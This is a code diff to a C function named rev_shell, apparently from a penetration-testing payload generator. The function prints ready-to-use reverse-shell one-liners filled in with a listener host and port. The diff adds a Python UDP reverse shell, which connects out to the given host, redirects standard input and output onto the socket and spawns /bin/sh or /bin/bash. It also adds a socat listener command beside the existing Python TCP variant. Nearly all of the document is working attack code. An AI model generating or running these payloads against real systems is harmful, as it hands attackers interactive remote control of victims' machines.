@@ -35,12 +35,18 @@ int rev_shell(char* lhost,char* lport,char* type) {
     }
     check = strcmp(type,"python");
     if (check == 0){
-        printf("Python:\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);");
+        printf("Python TCP:\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);");
         printf("s.connect((\"%s\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);",lhost,lport);
         printf("subprocess.call([\"/bin/sh\",\"-i\"])'\n\n");
         printf("import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n");
         printf("s.connect((\"%s\",%s))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\n",lhost,lport);
-        printf("subprocess.call([\"/bin/sh\",\"-i\"])\n");
+        printf("subprocess.call([\"/bin/sh\",\"-i\"])\n\n\n");
+        printf("Python UDP:\npython -c 'import pty,socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);");
+        printf("s.connect((\"%s\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);",lhost,lport);
+        printf("pty.spawn(\"/bin/bash\")'\n\n");
+        printf("import pty,socket,os\ns=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)\n");
+        printf("s.connect((\"%s\",%s))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\n",lhost,lport);
+        printf("pty.spawn(\"/bin/sh\")\n\nUse socat file:`tty`,raw,echo=0 udp-listen:\"%s\" for auto pty",lport);
     }
     check = strcmp(type,"powershell");
     if (check == 0){
